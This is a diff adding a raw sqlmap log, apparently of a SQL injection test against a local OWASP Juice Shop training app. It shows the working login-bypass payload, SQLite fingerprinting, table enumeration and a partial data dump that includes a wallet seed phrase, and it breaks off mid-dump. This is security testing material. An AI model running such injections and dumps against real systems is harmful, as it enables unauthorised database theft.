@@ -1,0 +1,857 @@
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.2.14#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 06:23:31 /2026-03-04/
+
+[06:23:31] [WARNING] using '/output' as the output directory
+[1/1] URL:
+GET http://localhost:3000/rest/user/login
+POST data: {"email":"*","password":"test"}
+do you want to test this URL? [Y/n/q]
+> Y
+[06:23:31] [INFO] testing URL 'http://localhost:3000/rest/user/login'
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[06:23:31] [INFO] using '/output/results-03042026_0623am.csv' as the CSV results file in multiple targets mode
+[06:23:31] [INFO] testing connection to the target URL
+[06:23:31] [ERROR] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code', skipping to the next target
+[06:23:31] [WARNING] HTTP error codes detected during run:
+401 (Unauthorized) - 1 times
+[06:23:31] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/output/results-03042026_0623am.csv'
+
+[*] ending @ 06:23:31 /2026-03-04/
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.2.14#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 06:23:42 /2026-03-04/
+
+[06:23:42] [WARNING] using '/output' as the output directory
+[1/1] URL:
+GET http://localhost:3000/rest/user/login
+POST data: {"email":"*","password":"test"}
+do you want to test this URL? [Y/n/q]
+> Y
+[06:23:42] [INFO] testing URL 'http://localhost:3000/rest/user/login'
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[06:23:42] [INFO] flushing session file
+[06:23:42] [INFO] using '/output/results-03042026_0623am.csv' as the CSV results file in multiple targets mode
+[06:23:42] [INFO] testing connection to the target URL
+[06:23:42] [INFO] checking if the target is protected by some kind of WAF/IPS
+[06:23:42] [INFO] testing if the target URL content is stable
+[06:23:43] [INFO] target URL content is stable
+[06:23:43] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
+[06:23:43] [WARNING] (custom) POST parameter 'JSON #1*' does not appear to be dynamic
+[06:23:43] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
+[06:23:43] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
+[06:23:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[06:23:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[06:23:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[06:23:45] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --code=401)
+[06:23:45] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[06:23:45] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
+[06:24:17] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
+[06:24:17] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
+[06:24:48] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
+[06:24:48] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[06:24:48] [INFO] checking if the injection point on (custom) POST parameter 'JSON #1*' is a false positive
+(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 229 HTTP(s) requests:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: {"email":"' OR NOT 6822=6822-- wPLa","password":"test"}
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[06:24:49] [INFO] testing SQLite
+[06:24:49] [INFO] confirming SQLite
+[06:24:49] [INFO] actively fingerprinting SQLite
+[06:24:49] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[06:24:49] [INFO] fetching tables for database: 'SQLite_masterdb'
+[06:24:49] [INFO] fetching number of tables for database 'SQLite_masterdb'
+
+[06:24:49] [INFO] retrieved: 21
+[06:24:49] [INFO] retrieving the length of query output
+
+[06:24:49] [INFO] retrieved: 5
+[06:24:49] [INFO] retrieved: _____
+[06:24:49] [INFO] retrieved: 
+[06:24:50] [INFO] retrieved: Users           
+[06:24:50] [INFO] retrieved: Users
+[06:24:50] [INFO] retrieving the length of query output
+
+[06:24:50] [INFO] retrieved: 15
+[06:24:50] [INFO] retrieved: _______________
+[06:24:50] [INFO] retrieved: 
+[06:24:51] [INFO] retrieved: sqlite_sequence             
+[06:24:51] [INFO] retrieved: sqlite_sequence
+[06:24:51] [INFO] retrieving the length of query output
+
+[06:24:51] [INFO] retrieved: 9
+[06:24:51] [INFO] retrieved: _________
+[06:24:51] [INFO] retrieved: 
+[06:24:52] [INFO] retrieved: Addresses           
+[06:24:52] [INFO] retrieved: Addresses
+[06:24:52] [INFO] retrieving the length of query output
+
+[06:24:52] [INFO] retrieved: 7
+[06:24:52] [INFO] retrieved: _______
+[06:24:52] [INFO] retrieved: 
+[06:24:53] [INFO] retrieved: Baskets           
+[06:24:53] [INFO] retrieved: Baskets
+[06:24:53] [INFO] retrieving the length of query output
+
+[06:24:53] [INFO] retrieved: 8
+[06:24:53] [INFO] retrieved: ________
+[06:24:53] [INFO] retrieved: 
+[06:24:54] [INFO] retrieved: Products           
+[06:24:54] [INFO] retrieved: Products
+[06:24:54] [INFO] retrieving the length of query output
+
+[06:24:54] [INFO] retrieved: 11
+[06:24:54] [INFO] retrieved: ___________
+[06:24:54] [INFO] retrieved: 
+[06:24:55] [INFO] retrieved: BasketItems             
+[06:24:55] [INFO] retrieved: BasketItems
+[06:24:55] [INFO] retrieving the length of query output
+
+[06:24:55] [INFO] retrieved: 8
+[06:24:55] [INFO] retrieved: ________
+[06:24:55] [INFO] retrieved: 
+[06:24:56] [INFO] retrieved: Captchas           
+[06:24:56] [INFO] retrieved: Captchas
+[06:24:56] [INFO] retrieving the length of query output
+
+[06:24:56] [INFO] retrieved: 5
+[06:24:56] [INFO] retrieved: _____
+[06:24:56] [INFO] retrieved: 
+[06:24:56] [INFO] retrieved: Cards           
+[06:24:56] [INFO] retrieved: Cards
+[06:24:56] [INFO] retrieving the length of query output
+
+[06:24:56] [INFO] retrieved: 10
+[06:24:56] [INFO] retrieved: __________
+[06:24:56] [INFO] retrieved: 
+[06:24:57] [INFO] retrieved: Challenges             
+[06:24:57] [INFO] retrieved: Challenges
+[06:24:57] [INFO] retrieving the length of query output
+
+[06:24:57] [INFO] retrieved: 10
+[06:24:57] [INFO] retrieved: __________
+[06:24:57] [INFO] retrieved: 
+[06:24:58] [INFO] retrieved: Complaints             
+[06:24:58] [INFO] retrieved: Complaints
+[06:24:58] [INFO] retrieving the length of query output
+
+[06:24:58] [INFO] retrieved: 10
+[06:24:58] [INFO] retrieved: __________
+[06:24:58] [INFO] retrieved: 
+[06:24:59] [INFO] retrieved: Deliveries             
+[06:24:59] [INFO] retrieved: Deliveries
+[06:24:59] [INFO] retrieving the length of query output
+
+[06:24:59] [INFO] retrieved: 9
+[06:24:59] [INFO] retrieved: _________
+[06:24:59] [INFO] retrieved: 
+[06:25:00] [INFO] retrieved: Feedbacks           
+[06:25:00] [INFO] retrieved: Feedbacks
+[06:25:00] [INFO] retrieving the length of query output
+
+[06:25:00] [INFO] retrieved: 5
+[06:25:00] [INFO] retrieved: _____
+[06:25:00] [INFO] retrieved: 
+[06:25:01] [INFO] retrieved: Hints           
+[06:25:01] [INFO] retrieved: Hints
+[06:25:01] [INFO] retrieving the length of query output
+
+[06:25:01] [INFO] retrieved: 13
+[06:25:01] [INFO] retrieved: _____________
+[06:25:01] [INFO] retrieved: 
+[06:25:02] [INFO] retrieved: ImageCaptchas             
+[06:25:02] [INFO] retrieved: ImageCaptchas
+[06:25:02] [INFO] retrieving the length of query output
+
+[06:25:02] [INFO] retrieved: 8
+[06:25:02] [INFO] retrieved: ________
+[06:25:02] [INFO] retrieved: 
+[06:25:03] [INFO] retrieved: Memories           
+[06:25:03] [INFO] retrieved: Memories
+[06:25:03] [INFO] retrieving the length of query output
+
+[06:25:03] [INFO] retrieved: 15
+[06:25:03] [INFO] retrieved: _______________
+[06:25:03] [INFO] retrieved: 
+[06:25:04] [INFO] retrieved: PrivacyRequests             
+[06:25:05] [INFO] retrieved: PrivacyRequests
+[06:25:05] [INFO] retrieving the length of query output
+
+[06:25:05] [INFO] retrieved: 10
+[06:25:05] [INFO] retrieved: __________
+[06:25:05] [INFO] retrieved: 
+[06:25:05] [INFO] retrieved: Quantities             
+[06:25:05] [INFO] retrieved: Quantities
+[06:25:05] [INFO] retrieving the length of query output
+
+[06:25:05] [INFO] retrieved: 8
+[06:25:06] [INFO] retrieved: ________
+[06:25:06] [INFO] retrieved: 
+[06:25:06] [INFO] retrieved: Recycles           
+[06:25:06] [INFO] retrieved: Recycles
+[06:25:06] [INFO] retrieving the length of query output
+
+[06:25:06] [INFO] retrieved: 17
+[06:25:06] [INFO] retrieved: _________________
+[06:25:06] [INFO] retrieved: 
+[06:25:08] [INFO] retrieved: SecurityQuestions             
+[06:25:08] [INFO] retrieved: SecurityQuestions
+[06:25:08] [INFO] retrieving the length of query output
+
+[06:25:08] [INFO] retrieved: 15
+[06:25:08] [INFO] retrieved: _______________
+[06:25:08] [INFO] retrieved: 
+[06:25:09] [INFO] retrieved: SecurityAnswers             
+[06:25:09] [INFO] retrieved: SecurityAnswers
+[06:25:09] [INFO] retrieving the length of query output
+
+[06:25:09] [INFO] retrieved: 7
+[06:25:09] [INFO] retrieved: _______
+[06:25:09] [INFO] retrieved: 
+[06:25:10] [INFO] retrieved: Wallets           
+[06:25:10] [INFO] retrieved: Wallets
+[06:25:10] [INFO] retrieving the length of query output
+
+[06:25:10] [INFO] retrieved: 38
+[06:25:10] [INFO] retrieved: __________________________________
+[06:25:10] [INFO] retrieved: 
+[06:25:14] [INFO] retrieved: ..E TABLE sqlite_sequence(name,seq)             
+[06:25:14] [INFO] retrieved: CREATE TABLE sqlite_sequence(name,seq)
+[06:25:14] [INFO] fetching entries for table 'sqlite_sequence'
+[06:25:14] [INFO] fetching number of entries for table 'sqlite_sequence' in database 'SQLite_masterdb'
+
+[06:25:14] [INFO] retrieved: 17
+[06:25:14] [INFO] retrieving the length of query output
+
+[06:25:14] [INFO] retrieved: 17
+[06:25:14] [INFO] retrieved: _________________
+[06:25:14] [INFO] retrieved: 
+[06:25:16] [INFO] retrieved: SecurityQuestions             
+[06:25:16] [INFO] retrieved: SecurityQuestions
+[06:25:16] [INFO] retrieving the length of query output
+
+[06:25:16] [INFO] retrieved: 2
+[06:25:16] [INFO] retrieved: __
+[06:25:16] [INFO] retrieved: 
+[06:25:16] [INFO] retrieved: 14           
+[06:25:16] [INFO] retrieved: 14
+[06:25:16] [INFO] retrieving the length of query output
+
+[06:25:16] [INFO] retrieved: 5
+[06:25:16] [INFO] retrieved: _____
+[06:25:16] [INFO] retrieved: 
+[06:25:16] [INFO] retrieved: Users           
+[06:25:17] [INFO] retrieved: Users
+[06:25:17] [INFO] retrieving the length of query output
+
+[06:25:17] [INFO] retrieved: 2
+[06:25:17] [INFO] retrieved: __
+[06:25:17] [INFO] retrieved: 
+[06:25:17] [INFO] retrieved: 22           
+[06:25:17] [INFO] retrieved: 22
+[06:25:17] [INFO] retrieving the length of query output
+
+[06:25:17] [INFO] retrieved: 15
+[06:25:17] [INFO] retrieved: _______________
+[06:25:17] [INFO] retrieved: 
+[06:25:18] [INFO] retrieved: SecurityAnswers             
+[06:25:18] [INFO] retrieved: SecurityAnswers
+[06:25:18] [INFO] retrieving the length of query output
+
+[06:25:18] [INFO] retrieved: 2
+[06:25:18] [INFO] retrieved: __
+[06:25:18] [INFO] retrieved: 
+[06:25:19] [INFO] retrieved: 20           
+[06:25:19] [INFO] retrieved: 20
+[06:25:19] [INFO] retrieving the length of query output
+
+[06:25:19] [INFO] retrieved: 9
+[06:25:19] [INFO] retrieved: _________
+[06:25:19] [INFO] retrieved: 
+[06:25:19] [INFO] retrieved: Addresses           
+[06:25:19] [INFO] retrieved: Addresses
+[06:25:19] [INFO] retrieving the length of query output
+
+[06:25:19] [INFO] retrieved: 1
+
+[06:25:20] [INFO] retrieved: 6
+[06:25:20] [INFO] retrieving the length of query output
+
+[06:25:20] [INFO] retrieved: 9
+[06:25:20] [INFO] retrieved: _________
+[06:25:20] [INFO] retrieved: 
+[06:25:21] [INFO] retrieved: Feedbacks           
+[06:25:21] [INFO] retrieved: Feedbacks
+[06:25:21] [INFO] retrieving the length of query output
+
+[06:25:21] [INFO] retrieved: 1
+
+[06:25:21] [INFO] retrieved: 8
+[06:25:21] [INFO] retrieving the length of query output
+
+[06:25:21] [INFO] retrieved: 5
+[06:25:21] [INFO] retrieved: _____
+[06:25:21] [INFO] retrieved: 
+[06:25:21] [INFO] retrieved: Cards           
+[06:25:21] [INFO] retrieved: Cards
+[06:25:21] [INFO] retrieving the length of query output
+
+[06:25:21] [INFO] retrieved: 1
+
+[06:25:22] [INFO] retrieved: 6
+[06:25:22] [INFO] retrieving the length of query output
+
+[06:25:22] [INFO] retrieved: 10
+[06:25:22] [INFO] retrieved: __________
+[06:25:22] [INFO] retrieved: 
+[06:25:23] [INFO] retrieved: Challenges             
+[06:25:23] [INFO] retrieved: Challenges
+[06:25:23] [INFO] retrieving the length of query output
+
+[06:25:23] [INFO] retrieved: 3
+[06:25:23] [INFO] retrieved: ___
+[06:25:23] [INFO] retrieved: 
+[06:25:23] [INFO] retrieved: 110           
+[06:25:23] [INFO] retrieved: 110
+[06:25:23] [INFO] retrieving the length of query output
+
+[06:25:23] [INFO] retrieved: 5
+[06:25:23] [INFO] retrieved: _____
+[06:25:23] [INFO] retrieved: 
+[06:25:24] [INFO] retrieved: Hints           
+[06:25:24] [INFO] retrieved: Hints
+[06:25:24] [INFO] retrieving the length of query output
+
+[06:25:24] [INFO] retrieved: 3
+[06:25:24] [INFO] retrieved: ___
+[06:25:24] [INFO] retrieved: 
+[06:25:24] [INFO] retrieved: 378           
+[06:25:24] [INFO] retrieved: 378
+[06:25:24] [INFO] retrieving the length of query output
+
+[06:25:24] [INFO] retrieved: 8
+[06:25:24] [INFO] retrieved: ________
+[06:25:24] [INFO] retrieved: 
+[06:25:25] [INFO] retrieved: Products           
+[06:25:25] [INFO] retrieved: Products
+[06:25:25] [INFO] retrieving the length of query output
+
+[06:25:25] [INFO] retrieved: 2
+[06:25:25] [INFO] retrieved: __
+[06:25:25] [INFO] retrieved: 
+[06:25:25] [INFO] retrieved: 46           
+[06:25:25] [INFO] retrieved: 46
+[06:25:25] [INFO] retrieving the length of query output
+
+[06:25:25] [INFO] retrieved: 7
+[06:25:25] [INFO] retrieved: _______
+[06:25:25] [INFO] retrieved: 
+[06:25:26] [INFO] retrieved: Baskets           
+[06:25:26] [INFO] retrieved: Baskets
+[06:25:26] [INFO] retrieving the length of query output
+
+[06:25:26] [INFO] retrieved: 1
+
+[06:25:26] [INFO] retrieved: 5
+[06:25:26] [INFO] retrieving the length of query output
+
+[06:25:26] [INFO] retrieved: 11
+[06:25:26] [INFO] retrieved: ___________
+[06:25:26] [INFO] retrieved: 
+[06:25:27] [INFO] retrieved: BasketItems             
+[06:25:27] [INFO] retrieved: BasketItems
+[06:25:27] [INFO] retrieving the length of query output
+
+[06:25:27] [INFO] retrieved: 1
+
+[06:25:27] [INFO] retrieved: 8
+[06:25:27] [INFO] retrieving the length of query output
+
+[06:25:27] [INFO] retrieved: 10
+[06:25:28] [INFO] retrieved: __________
+[06:25:28] [INFO] retrieved: 
+[06:25:28] [INFO] retrieved: Complaints             
+[06:25:28] [INFO] retrieved: Complaints
+[06:25:28] [INFO] retrieving the length of query output
+
+[06:25:28] [INFO] retrieved: 1
+
+[06:25:29] [INFO] retrieved: 1
+[06:25:29] [INFO] retrieving the length of query output
+
+[06:25:29] [INFO] retrieved: 8
+[06:25:29] [INFO] retrieved: ________
+[06:25:29] [INFO] retrieved: 
+[06:25:30] [INFO] retrieved: Recycles           
+[06:25:30] [INFO] retrieved: Recycles
+[06:25:30] [INFO] retrieving the length of query output
+
+[06:25:30] [INFO] retrieved: 1
+
+[06:25:30] [INFO] retrieved: 9
+[06:25:30] [INFO] retrieving the length of query output
+
+[06:25:30] [INFO] retrieved: 10
+[06:25:30] [INFO] retrieved: __________
+[06:25:30] [INFO] retrieved: 
+[06:25:31] [INFO] retrieved: Quantities             
+[06:25:31] [INFO] retrieved: Quantities
+[06:25:31] [INFO] retrieving the length of query output
+
+[06:25:31] [INFO] retrieved: 2
+[06:25:31] [INFO] retrieved: __
+[06:25:31] [INFO] retrieved: 
+[06:25:31] [INFO] retrieved: 46           
+[06:25:31] [INFO] retrieved: 46
+[06:25:31] [INFO] retrieving the length of query output
+
+[06:25:31] [INFO] retrieved: 7
+[06:25:31] [INFO] retrieved: _______
+[06:25:31] [INFO] retrieved: 
+[06:25:32] [INFO] retrieved: Wallets           
+[06:25:32] [INFO] retrieved: Wallets
+[06:25:32] [INFO] retrieving the length of query output
+
+[06:25:32] [INFO] retrieved: 2
+[06:25:32] [INFO] retrieved: __
+[06:25:32] [INFO] retrieved: 
+[06:25:32] [INFO] retrieved: 22           
+[06:25:32] [INFO] retrieved: 22
+[06:25:32] [INFO] retrieving the length of query output
+
+[06:25:32] [INFO] retrieved: 10
+[06:25:32] [INFO] retrieved: __________
+[06:25:32] [INFO] retrieved: 
+[06:25:33] [INFO] retrieved: Deliveries             
+[06:25:33] [INFO] retrieved: Deliveries
+[06:25:33] [INFO] retrieving the length of query output
+
+[06:25:33] [INFO] retrieved: 1
+
+[06:25:33] [INFO] retrieved: 3
+[06:25:33] [INFO] retrieving the length of query output
+
+[06:25:33] [INFO] retrieved: 8
+[06:25:34] [INFO] retrieved: ________
+[06:25:34] [INFO] retrieved: 
+[06:25:34] [INFO] retrieved: Memories           
+[06:25:34] [INFO] retrieved: Memories
+[06:25:34] [INFO] retrieving the length of query output
+
+[06:25:34] [INFO] retrieved: 2
+[06:25:34] [INFO] retrieved: __
+[06:25:34] [INFO] retrieved: 
+[06:25:35] [INFO] retrieved: 10           
+[06:25:35] [INFO] retrieved: 10
+Database: <current>
+Table: sqlite_sequence
+[17 entries]
++-----+-------------------+
+| seq | name              |
++-----+-------------------+
+| 14  | SecurityQuestions |
+| 22  | Users             |
+| 20  | SecurityAnswers   |
+| 6   | Addresses         |
+| 8   | Feedbacks         |
+| 6   | Cards             |
+| 110 | Challenges        |
+| 378 | Hints             |
+| 46  | Products          |
+| 5   | Baskets           |
+| 8   | BasketItems       |
+| 1   | Complaints        |
+| 9   | Recycles          |
+| 46  | Quantities        |
+| 22  | Wallets           |
+| 3   | Deliveries        |
+| 10  | Memories          |
++-----+-------------------+
+
+[06:25:35] [INFO] table 'SQLite_masterdb.sqlite_sequence' dumped to CSV file '/output/localhost/dump/SQLite_masterdb/sqlite_sequence.csv'
+[06:25:35] [INFO] retrieving the length of query output
+
+[06:25:35] [INFO] retrieved: 260
+[06:25:35] [INFO] retrieved: __________________________________
+[06:25:35] [INFO] retrieved: 
+[06:26:00] [INFO] retrieved: ..L, `updatedAt` DATETIME NOT NULL)               
+[06:26:00] [INFO] retrieved: CREATE TABLE `Feedbacks` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `comment` VARCHAR(255), `rating` INTEGER NOT NULL, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)
+[06:26:00] [INFO] fetching entries for table 'Feedbacks'
+[06:26:00] [INFO] fetching number of entries for table 'Feedbacks' in database 'SQLite_masterdb'
+
+[06:26:00] [INFO] retrieved: 8
+[06:26:00] [INFO] retrieving the length of query output
+
+[06:26:00] [INFO] retrieved: 1
+
+[06:26:00] [INFO] retrieved: 1
+[06:26:00] [INFO] retrieving the length of query output
+
+[06:26:00] [INFO] retrieved: 80
+[06:26:01] [INFO] retrieved: __________________________________
+[06:26:01] [INFO] retrieved: 
+[06:26:08] [INFO] retrieved: .. recommended! (***in@juice-sh.op)             
+[06:26:08] [INFO] retrieved: I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)
+[06:26:08] [INFO] retrieving the length of query output
+
+[06:26:08] [INFO] retrieved: 30
+[06:26:08] [INFO] retrieved: ______________________________
+[06:26:08] [INFO] retrieved: 
+[06:26:11] [INFO] retrieved: 2026-03-04 05:47:21.162 +00:00             
+[06:26:11] [INFO] retrieved: 2026-03-04 05:47:21.162 +00:00
+[06:26:11] [INFO] retrieving the length of query output
+
+[06:26:11] [INFO] retrieved: 1
+
+[06:26:11] [INFO] retrieved: 1
+[06:26:11] [INFO] retrieving the length of query output
+
+[06:26:11] [INFO] retrieved: 1
+
+[06:26:11] [INFO] retrieved: 5
+[06:26:11] [INFO] retrieving the length of query output
+
+[06:26:11] [INFO] retrieved: 30
+[06:26:12] [INFO] retrieved: ______________________________
+[06:26:12] [INFO] retrieved: 
+[06:26:14] [INFO] retrieved: 2026-03-04 05:47:21.162 +00:00             
+[06:26:14] [INFO] retrieved: 2026-03-04 05:47:21.162 +00:00
+[06:26:14] [INFO] retrieving the length of query output
+
+[06:26:14] [INFO] retrieved: 1
+
+[06:26:14] [INFO] retrieved: 2
+[06:26:15] [INFO] retrieving the length of query output
+
+[06:26:15] [INFO] retrieved: 46
+[06:26:15] [INFO] retrieved: __________________________________
+[06:26:15] [INFO] retrieved: 
+[06:26:19] [INFO] retrieved: ..wesome service! (***@juice-sh.op)             
+[06:26:19] [INFO] retrieved: Great shop! Awesome service! (***@juice-sh.op)
+[06:26:19] [INFO] retrieving the length of query output
+
+[06:26:19] [INFO] retrieved: 30
+[06:26:19] [INFO] retrieved: ______________________________
+[06:26:19] [INFO] retrieved: 
+[06:26:22] [INFO] retrieved: 2026-03-04 05:47:21.163 +00:00             
+[06:26:22] [INFO] retrieved: 2026-03-04 05:47:21.163 +00:00
+[06:26:22] [INFO] retrieving the length of query output
+
+[06:26:22] [INFO] retrieved: 1
+
+[06:26:22] [INFO] retrieved: 2
+[06:26:22] [INFO] retrieving the length of query output
+
+[06:26:22] [INFO] retrieved: 1
+
+[06:26:22] [INFO] retrieved: 4
+[06:26:22] [INFO] retrieving the length of query output
+
+[06:26:22] [INFO] retrieved: 30
+[06:26:22] [INFO] retrieved: ______________________________
+[06:26:22] [INFO] retrieved: 
+[06:26:25] [INFO] retrieved: 2026-03-04 05:47:21.163 +00:00             
+[06:26:25] [INFO] retrieved: 2026-03-04 05:47:21.163 +00:00
+[06:26:25] [INFO] retrieving the length of query output
+
+[06:26:25] [INFO] retrieved: 1
+
+[06:26:26] [INFO] retrieved: 3
+[06:26:26] [INFO] retrieving the length of query output
+
+[06:26:26] [INFO] retrieved: 51
+[06:26:26] [INFO] retrieved: __________________________________
+[06:26:26] [INFO] retrieved: 
+[06:26:30] [INFO] retrieved: ..ilable here! (***der@juice-sh.op)             
+[06:26:30] [INFO] retrieved: Nothing useful available here! (***der@juice-sh.op)
+[06:26:30] [INFO] retrieving the length of query output
+
+[06:26:30] [INFO] retrieved: 30
+[06:26:30] [INFO] retrieved: ______________________________
+[06:26:30] [INFO] retrieved: 
+[06:26:33] [INFO] retrieved: 2026-03-04 05:47:21.164 +00:00             
+[06:26:33] [INFO] retrieved: 2026-03-04 05:47:21.164 +00:00
+[06:26:33] [INFO] retrieving the length of query output
+
+[06:26:33] [INFO] retrieved: 1
+
+[06:26:33] [INFO] retrieved: 3
+[06:26:33] [INFO] retrieving the length of query output
+
+[06:26:33] [INFO] retrieved: 1
+
+[06:26:33] [INFO] retrieved: 1
+[06:26:34] [INFO] retrieving the length of query output
+
+[06:26:34] [INFO] retrieved: 30
+[06:26:34] [INFO] retrieved: ______________________________
+[06:26:34] [INFO] retrieved: 
+[06:26:37] [INFO] retrieved: 2026-03-04 05:47:21.164 +00:00             
+[06:26:37] [INFO] retrieved: 2026-03-04 05:47:21.164 +00:00
+[06:26:37] [INFO] retrieving the length of query output
+
+[06:26:37] [INFO] retrieved: 2
+[06:26:37] [INFO] retrieved: __
+[06:26:37] [INFO] retrieved: 
+[06:26:37] [INFO] retrieved: 21           
+[06:26:37] [INFO] retrieved: 21
+[06:26:37] [INFO] retrieving the length of query output
+
+[06:26:37] [INFO] retrieved: 171
+[06:26:37] [INFO] retrieved: __________________________________
+[06:26:37] [INFO] retrieved: 
+[06:26:51] [INFO] retrieved: ..ft clutch" (***ereum@juice-sh.op)               
+[06:26:51] [INFO] retrieved: Please send me the juicy chatbot NFT in my wallet at /juicy-nft : "purpose betray marriage blame crunch monitor spin slide donate sport lift clutch" (***ereum@juice-sh.op)
+[06:26:51] [INFO] retrieving the length of query output
+
+[06:26:51] [INFO] retrieved: 30
+[06:26:52] [INFO] retrieved: ______________________________
+[06:26:52] [INFO] retrieved: 
+[06:26:54] [INFO] retrieved: 2026-03-04 05:47:21.176 +00:00             
+[06:26:54] [INFO] retrieved: 2026-03-04 05:47:21.176 +00:00
+[06:26:54] [INFO] retrieving the length of query output
+
+[06:26:54] [INFO] retrieved: 1
+
+[06:26:54] [INFO] retrieved: 4
+[06:26:55] [INFO] retrieving the length of query output
+
+[06:26:55] [INFO] retrieved: 1
+
+[06:26:55] [INFO] retrieved: 1
+[06:26:55] [INFO] retrieving the length of query output
+
+[06:26:55] [INFO] retrieved: 30
+[06:26:55] [INFO] retrieved: ______________________________
+[06:26:55] [INFO] retrieved: 
+[06:26:58] [INFO] retrieved: 2026-03-04 05:47:21.176 +00:00             
+[06:26:58] [INFO] retrieved: 2026-03-04 05:47:21.176 +00:00
+[06:26:58] [INFO] retrieving the length of query output
+
+[06:26:58] [INFO] retrieved:  
+
+[06:26:58] [INFO] retrieved:  
+[06:26:58] [INFO] retrieving the length of query output
+
+[06:26:58] [INFO] retrieved: 180
+[06:26:58] [INFO] retrieved: __________________________________
+[06:26:58] [INFO] retrieved: 
+[06:27:13] [INFO] retrieved: ..d to complaints!</em> (anonymous)               
+[06:27:13] [INFO] retrieved: Incompetent customer support! Can't even upload photo of broken purchase!<br /><em>Support Team: Sorry, only order confirmation PDFs can be attached to complaints!</em> (anonymous)
+[06:27:13] [INFO] retrieving the length of query output
+
+[06:27:13] [INFO] retrieved: 30
+[06:27:14] [INFO] retrieved: ______________________________
+[06:27:14] [INFO] retrieved: 
+[06:27:16] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00             
+[06:27:17] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00
+[06:27:17] [INFO] retrieving the length of query output
+
+[06:27:17] [INFO] retrieved: 1
+
+[06:27:17] [INFO] retrieved: 5
+[06:27:17] [INFO] retrieving the length of query output
+
+[06:27:17] [INFO] retrieved: 1
+
+[06:27:17] [INFO] retrieved: 2
+[06:27:17] [INFO] retrieving the length of query output
+
+[06:27:17] [INFO] retrieved: 30
+[06:27:17] [INFO] retrieved: ______________________________
+[06:27:17] [INFO] retrieved: 
+[06:27:20] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00             
+[06:27:20] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00
+[06:27:20] [INFO] retrieving the length of query output
+
+[06:27:20] [INFO] retrieved:  
+
+[06:27:20] [INFO] retrieved:  
+[06:27:20] [INFO] retrieving the length of query output
+
+[06:27:20] [INFO] retrieved: 68
+[06:27:21] [INFO] retrieved: __________________________________
+[06:27:21] [INFO] retrieved: 
+[06:27:27] [INFO] retrieved: ..e stuff of all kinds! (anonymous)             
+[06:27:27] [INFO] retrieved: This is <b>the</b> store for awesome stuff of all kinds! (anonymous)
+[06:27:27] [INFO] retrieving the length of query output
+
+[06:27:27] [INFO] retrieved: 30
+[06:27:27] [INFO] retrieved: ______________________________
+[06:27:27] [INFO] retrieved: 
+[06:27:30] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00             
+[06:27:30] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00
+[06:27:30] [INFO] retrieving the length of query output
+
+[06:27:30] [INFO] retrieved: 1
+
+[06:27:30] [INFO] retrieved: 6
+[06:27:30] [INFO] retrieving the length of query output
+
+[06:27:30] [INFO] retrieved: 1
+
+[06:27:30] [INFO] retrieved: 4
+[06:27:30] [INFO] retrieving the length of query output
+
+[06:27:30] [INFO] retrieved: 30
+[06:27:31] [INFO] retrieved: ______________________________
+[06:27:31] [INFO] retrieved: 
+[06:27:33] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00             
+[06:27:33] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00
+[06:27:33] [INFO] retrieving the length of query output
+
+[06:27:33] [INFO] retrieved:  
+
+[06:27:33] [INFO] retrieved:  
+[06:27:34] [INFO] retrieving the length of query output
+
+[06:27:34] [INFO] retrieved: 84
+[06:27:34] [INFO] retrieved: __________________________________
+[06:27:34] [INFO] retrieved: 
+[06:27:41] [INFO] retrieved: ..or the great service! (anonymous)             
